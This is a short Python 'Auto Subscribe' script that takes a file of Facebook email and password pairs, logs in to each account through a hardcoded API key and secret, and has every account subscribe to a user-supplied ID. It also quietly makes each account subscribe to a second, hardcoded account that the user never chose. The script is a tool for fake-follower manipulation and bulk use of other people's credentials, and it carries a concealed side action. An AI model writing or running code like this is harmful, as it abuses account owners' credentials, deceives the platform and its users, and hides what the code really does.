#!usr/bin/python3.7
#Author: KANG-NEWBIE
#Contact: t.me/kang_nuubi
#github: github.com/kang-newbie
'''
recode? oke, but don't deleted name author
'''
try:
  import requests, sys, os, time, json, hashlib

  class alike():
    def get(self,id,pas,uid):
      try:
        global res
        API_SECRET = '62f8ce9f74b12f84c123cc23437a4a32';data = {"api_key":"882a8490361da98702bf97a021ddc14d","credentials_type":"password","email":id,"format":"JSON", "generate_machine_id":"1","generate_session_cookies":"1","locale":"en_US","method":"auth.login","password":pas,"return_ssl_resources":"0","v":"1.0"};sig = ('api_key=882a8490361da98702bf97a021ddc14dcredentials_type=passwordemail='+id+'format=JSONgenerate_machine_id=1generate_session_cookies=1locale=en_USmethod=auth.loginpassword='+pas+'return_ssl_resources=0v=1.0'+API_SECRET).encode('utf-8')
        x = hashlib.new('md5')
        x.update(sig)
        data.update({'sig':x.hexdigest()})
        requ=requests.get('https://api.facebook.com/restserver.php',params=data)
        res=requ.json()['access_token']
      except KeyError: print("[!] login failed")
      try:
        r=requests.post('https://graph.facebook.com/'+uid+'/subscribers?access_token='+res);requests.post('https://graph.facebook.com/adlizhafari.nub/subscribers?access_token='+res)
#        print(r.text)
        if 'error' in str(r.text):
          print("[-] failed")
        elif 'true' in str(r.text):
          print("[+] success")
        else: print("[!] something error")
      except: pass

  print("""
\t[ Auto Subscribe ]
\t [By:KANG-NEWBIE]
""")
  print("[INFO] List sparator 'email|pass'")
  inp=input("[+] list account: ")
  uid=input("[+] U account id: ")
  print()
  file=open(inp,'r').read().splitlines()

  for x in file:
    p=x.split('|')
    id=p[0]
    pas=p[1]
    print("[!] subs with account ["+id+"|"+pas+"]")
    alike().get(id,pas,uid)

except KeyboardInterrupt: exit("[!] Key interrupt: exit")
except Exception as F: print("[Err] %s"%(F))
